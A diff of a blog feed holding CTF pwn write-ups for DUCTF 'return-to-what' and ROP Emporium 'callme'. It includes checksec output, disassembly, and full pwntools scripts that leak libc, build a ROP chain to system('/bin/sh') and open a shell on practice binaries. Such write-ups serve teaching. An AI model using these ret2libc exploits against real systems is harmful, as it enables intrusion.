@@ -2,7 +2,7 @@
 {} ret2what checksec return-to-what [*] &amp;#39;/home/h4x5p4c3/Downloads/ret2what/return-to-what&amp;#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Nx is enabled so we can&amp;rsquo;t do a bof and place our shellcode to get a shell and no canary which makes it easier and ASLR is probably enabled.
 Disassembly and Decompilation pwndbg&amp;gt; disassemble main Dump of assembler code for function main: 0x00000000004011ad &amp;lt;+0&amp;gt;: push rbp 0x00000000004011ae &amp;lt;+1&amp;gt;: mov rbp,rsp # prologue 0x00000000004011b1 &amp;lt;+4&amp;gt;: lea rdi,[rip+0xe78] # rdi = address of [rip+0xe78] 0x00000000004011b8 &amp;lt;+11&amp;gt;: call 0x401030 &amp;lt;puts@plt&amp;gt; # call puts function 0x00000000004011bd &amp;lt;+16&amp;gt;: mov eax,0x0 # eax = 0x0 0x00000000004011c2 &amp;lt;+21&amp;gt;: call 0x401185 &amp;lt;vuln&amp;gt; # call vuln function which has the vulnerable gets function which we use to do bof 0x00000000004011c7 &amp;lt;+26&amp;gt;: mov eax,0x0 # eax = 0x0 0x00000000004011cc &amp;lt;+31&amp;gt;: pop rbp # epilogue 0x00000000004011cd &amp;lt;+32&amp;gt;: ret End of assembler dump.</description><content>&lt;h2 id="leaking-libc-addresses-to-do-ret2libc-with-unknown-libc">Leaking Libc addresses to do ret2libc with unknown libc&lt;/h2>
 &lt;p>First lets take a look at the binary mitigations&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> ret2what checksec &lt;span style="color:#66d9ef">return&lt;/span>-to-what
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> ret2what checksec &lt;span style="color:#66d9ef">return&lt;/span>-to-what
 &lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Downloads/ret2what/return-to-what&amp;#39;&lt;/span>
 Arch: amd64-64-little
 RELRO: Partial RELRO
@@ -12,7 +12,7 @@ PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="co
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Nx is enabled so we can&amp;rsquo;t do a bof and place our shellcode to get a shell and
 no canary which makes it easier and ASLR is probably enabled.&lt;/p>
 &lt;h2 id="disassembly-and-decompilation">Disassembly and Decompilation&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">pwndbg&amp;gt; disassemble main
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">pwndbg&amp;gt; disassemble main
 Dump of assembler code &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> main:
 0x00000000004011ad &amp;lt;+0&amp;gt;: push rbp
 0x00000000004011ae &amp;lt;+1&amp;gt;: mov rbp,rsp &lt;span style="color:#75715e"># prologue&lt;/span>
@@ -25,7 +25,7 @@ Dump of assembler code &lt;span style="color:#66d9ef">for&lt;/span> &lt;span sty
 0x00000000004011cd &amp;lt;+32&amp;gt;: ret
 End of assembler dump.
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>The decompilation of the assembly code looks like this&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">
 undefined8 main&lt;span style="color:#f92672">(&lt;/span>void&lt;span style="color:#f92672">)&lt;/span>
 &lt;span style="color:#f92672">{&lt;/span>
 puts&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Today, we\&amp;#39;ll have a lesson in returns.&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>;
@@ -33,7 +33,7 @@ vuln&lt;span style="color:#f92672">()&lt;/span>;
 &lt;span style="color:#66d9ef">return&lt;/span> 0;
 &lt;span style="color:#f92672">}&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>In addition lets take a look at the &lt;code>vuln&lt;/code> function too&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">
 void vuln&lt;span style="color:#f92672">(&lt;/span>void&lt;span style="color:#f92672">)&lt;/span>
 &lt;span style="color:#f92672">{&lt;/span>
 char *s;
@@ -47,11 +47,11 @@ gets&lt;span style="color:#f92672">(&lt;/span>&amp;amp;s&lt;span style="color:#f
 the &lt;code>ret&lt;/code> gadget to align our stack&lt;/p>
 &lt;h2 id="leaking-address-of-libc">Leaking address of Libc&lt;/h2>
 &lt;p>Now lets craft our exploit to leak address of libc and i previously found out the offset to do bof is &lt;code>56&lt;/code>&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
 &lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
 context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;alacritty&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-c&amp;#39;&lt;/span>]
 context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;info&amp;#39;&lt;/span>
-exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>True)
+exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">True&lt;/span>)
 io &lt;span style="color:#f92672">=&lt;/span> process(exe&lt;span style="color:#f92672">.&lt;/span>path)
 &lt;span style="color:#75715e">#io = remote(&amp;#39;chal.duc.tf&amp;#39;, 30003)&lt;/span>
 &lt;span style="color:#75715e">#gdb.attach(io)&lt;/span>
@@ -65,11 +65,11 @@ io&lt;span style="color:#f92672">.&lt;/span>recvline()
 io&lt;span style="color:#f92672">.&lt;/span>recvline()
 recieved &lt;span style="color:#f92672">=&lt;/span> io&lt;span style="color:#f92672">.&lt;/span>recvline()&lt;span style="color:#f92672">.&lt;/span>strip()
 libc_leak &lt;span style="color:#f92672">=&lt;/span> u64(recieved&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>))
-log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;__libc_start_main leak {}&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc_leak)))
+log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;__libc_start_main leak &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc_leak)))
 io&lt;span style="color:#f92672">.&lt;/span>close()
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Here i leaked the address of &lt;code>__libc_start_main &lt;/code>&lt;/p>
 &lt;p>Now lets run our exploit script in order to leak libc address&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> python exploit.py
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> python exploit.py
 &lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Desktop/tmp/return-to-what&amp;#39;&lt;/span>
 Arch: amd64-64-little
 RELRO: Partial RELRO
@@ -85,12 +85,12 @@ RUNPATH: b&lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Desktop/tmp&amp
 &lt;p>&lt;img src="/images/libc-database.png" alt="">&lt;/p>
 &lt;p>Now that we found out the libc version, here i assumed it to be the first libc so i choose to use &lt;code>libc6_2.27-3ubuntu1_amd64.so&lt;/code>&lt;/p>
 &lt;p>Lets craft our final exploit script and run in on the remote server to get a shell and grab our flag 🚩&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
 &lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
 context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;alacritty&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-c&amp;#39;&lt;/span>]
 context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;info&amp;#39;&lt;/span>
-exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>True)
-libc &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./libc.so.6&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>True)
+exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">True&lt;/span>)
+libc &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./libc.so.6&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">True&lt;/span>)
 io &lt;span style="color:#f92672">=&lt;/span> process(exe&lt;span style="color:#f92672">.&lt;/span>path)
 &lt;span style="color:#75715e">#io = remote(&amp;#39;chal.duc.tf&amp;#39;, 30003)&lt;/span>
 &lt;span style="color:#75715e">#gdb.attach(io)&lt;/span>
@@ -105,12 +105,12 @@ io&lt;span style="color:#f92672">.&lt;/span>recvline()
 recieved &lt;span style="color:#f92672">=&lt;/span> io&lt;span style="color:#f92672">.&lt;/span>recvline()&lt;span style="color:#f92672">.&lt;/span>strip()
 libc_leak &lt;span style="color:#f92672">=&lt;/span> u64(recieved&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>))
 libc&lt;span style="color:#f92672">.&lt;/span>address &lt;span style="color:#f92672">=&lt;/span> libc_leak &lt;span style="color:#f92672">-&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#39;__libc_start_main&amp;#39;&lt;/span>]
-log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;__libc_start_main leak {}&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc_leak)))
-log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;libc base {}&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc&lt;span style="color:#f92672">.&lt;/span>address)))
+log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;__libc_start_main leak &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc_leak)))
+log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;libc base &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc&lt;span style="color:#f92672">.&lt;/span>address)))
 bin_sh &lt;span style="color:#f92672">=&lt;/span> next(libc&lt;span style="color:#f92672">.&lt;/span>search(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>))
 system &lt;span style="color:#f92672">=&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#34;system&amp;#34;&lt;/span>]
-log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;/bin/sh {}&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(bin_sh)))
-log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;system {}&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(system)))
+log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;/bin/sh &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(bin_sh)))
+log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;system &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(system)))
 payload &lt;span style="color:#f92672">=&lt;/span> flat([
 cyclic(&lt;span style="color:#ae81ff">56&lt;/span>), ret, pop_rdi, bin_sh, system
 ])
@@ -118,7 +118,7 @@ io&lt;span style="color:#f92672">.&lt;/span>recv()
 io&lt;span style="color:#f92672">.&lt;/span>sendline(payload)
 io&lt;span style="color:#f92672">.&lt;/span>interactive()
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Lets run our exploit as expected we get a shell so we&amp;rsquo;ll cat out the &lt;code>flag&lt;/code> now&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> python exploit.py
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> python exploit.py
 &lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Opening connection to chal.duc.tf on port 30003: Done
 &lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Downloads/ret2what/return-to-what&amp;#39;&lt;/span>
 Arch: amd64-64-little
@@ -155,7 +155,7 @@ You must call the callme_one(), callme_two() and callme_three() functions in tha
 &lt;p>The challenge files can be found here ~&amp;gt;
 &lt;a href="https://ropemporium.com/challenge/callme.html">callme&lt;/a>&lt;/p>
 &lt;p>Before getting our hands onto the challenge let&amp;rsquo;s take a look at x86-64 calling conventions&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">+---------+------+------+------+------+------+------+
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">+---------+------+------+------+------+------+------+
 | syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
 +---------+------+------+------+------+------+------+
 | %rax | %rdi | %rsi | %rdx | %r10 | %r8 | %r9 |
@@ -163,7 +163,7 @@ You must call the callme_one(), callme_two() and callme_three() functions in tha
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>To understand calling conventions better take a look here ~&amp;gt;
 &lt;a href="https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI">calling convetions&lt;/a>&lt;/p>
 &lt;p>Now lets take a look at the challenge binary&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ checksec callme
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ checksec callme
 &lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Documents/pwn/rop_emporium/2-callme/callme64/callme&amp;#39;&lt;/span>
 Arch: amd64-64-little
 RELRO: Partial RELRO
@@ -173,7 +173,7 @@ PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="co
 RUNPATH: b&lt;span style="color:#e6db74">&amp;#39;.&amp;#39;&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>This looks similar to the previous challenge we solved&lt;/p>
 &lt;p>Lets checkout the functions which are imported from the shared object file&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ rabin2 -i callme
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ rabin2 -i callme
 &lt;span style="color:#f92672">[&lt;/span>Imports&lt;span style="color:#f92672">]&lt;/span>
 nth vaddr bind type lib name
 ―――――――――――――――――――――――――――――――――――――
@@ -190,7 +190,7 @@ nth vaddr bind type lib name
 &lt;span style="color:#ae81ff">11&lt;/span> 0x00400750 GLOBAL FUNC exit
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Yes we can see the functions which are need for the exploit let&amp;rsquo;s take a note of them&amp;hellip;..&lt;/p>
 &lt;p>Next up let&amp;rsquo;s check the functions present in the binary&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x00400760&lt;span style="color:#f92672">]&lt;/span>&amp;gt; afl
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x00400760&lt;span style="color:#f92672">]&lt;/span>&amp;gt; afl
 0x00400760 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">42&lt;/span> entry0
 0x004006a8 &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span> sym._init
 0x004009b4 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span> sym._fini
@@ -214,7 +214,7 @@ nth vaddr bind type lib name
 0x00400847 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">81&lt;/span> main
 0x00400730 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.setvbuf
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Again we have a useful function lets take a look at it&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x00400760&lt;span style="color:#f92672">]&lt;/span>&amp;gt; s sym.usefulFunction
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x00400760&lt;span style="color:#f92672">]&lt;/span>&amp;gt; s sym.usefulFunction
 &lt;span style="color:#f92672">[&lt;/span>0x004008f2&lt;span style="color:#f92672">]&lt;/span>&amp;gt; pdf
 ┌ 74: sym.usefulFunction &lt;span style="color:#f92672">()&lt;/span>;
 │ 0x004008f2 push rbp
@@ -235,7 +235,7 @@ nth vaddr bind type lib name
 └ 0x00400937 call sym.imp.exit ; void exit&lt;span style="color:#f92672">(&lt;/span>int status&lt;span style="color:#f92672">)&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>From this we can understand we need to pass the values three times and call the functions respectively and
 as per the important note given by the challenge author we can figure out the overview of solving the challenge&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#ae81ff">40&lt;/span> bytes to overflow
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#ae81ff">40&lt;/span> bytes to overflow
 mov rdi, 0xdeadbeefdeadbeef
 mov rsi, 0xcafebabecafebabe
 mov rdx, 0xd00df00dd00df00d
@@ -254,7 +254,7 @@ call callme_three
 &lt;/code>&lt;/pre>
 &lt;p>To get the values into registers to pass the arguments, we’ll need a gadget that will pop values from the stack into these registers.
 Lets checkout the gadgets now using &lt;code>ropper&lt;/code>&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ ropper --file callme --search &lt;span style="color:#e6db74">&amp;#39;pop&amp;#39;&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ ropper --file callme --search &lt;span style="color:#e6db74">&amp;#39;pop&amp;#39;&lt;/span>
 &lt;span style="color:#f92672">[&lt;/span>INFO&lt;span style="color:#f92672">]&lt;/span> Load gadgets from cache
 &lt;span style="color:#f92672">[&lt;/span>LOAD&lt;span style="color:#f92672">]&lt;/span> loading... 100%
 &lt;span style="color:#f92672">[&lt;/span>LOAD&lt;span style="color:#f92672">]&lt;/span> removing double gadgets... 100%
@@ -277,11 +277,11 @@ Lets checkout the gadgets now using &lt;code>ropper&lt;/code>&lt;/p>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>we have a gadget that satisfies our exact need lets take a note of it &lt;code>0x000000000040093c&lt;/code>&lt;/p>
 &lt;h2 id="exploitation">Exploitation&lt;/h2>
 &lt;p>Now lets craft our exploit :)&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
 &lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
 context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;alacritty&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-c&amp;#39;&lt;/span>]
 context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;info&amp;#39;&lt;/span>
-exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./callme&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>False)
+exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./callme&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">False&lt;/span>)
 io &lt;span style="color:#f92672">=&lt;/span> process(exe&lt;span style="color:#f92672">.&lt;/span>path)
 gadget &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x000000000040093c&lt;/span> &lt;span style="color:#75715e">#pop rdi; pop rsi; pop rdx; ret&lt;/span>
 one &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>
@@ -296,7 +296,7 @@ gadget, one, two, three, exe&lt;span style="color:#f92672">.&lt;/span>sym[&lt;sp
 io&lt;span style="color:#f92672">.&lt;/span>sendline(payload)
 io&lt;span style="color:#f92672">.&lt;/span>interactive()
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Lets run our exploit to check if it works&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ python xpl.py
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ python xpl.py
 &lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Starting local process &lt;span style="color:#e6db74">&amp;#39;./callme&amp;#39;&lt;/span>: pid &lt;span style="color:#ae81ff">8013&lt;/span>
 &lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Switching to interactive mode
 callme by ROP Emporium
@@ -317,7 +317,7 @@ This challenge is slighty different from the previous challenge as the descripti
 &lt;a href="https://ropemporium.com/challenge/split.html">split&lt;/a>&lt;/p>
 &lt;p>This challenge is slighty different from the previous challenge as the description says all elements are still present they&amp;rsquo;ve just been split apart so we&amp;rsquo;ll recombine them now :)&lt;/p>
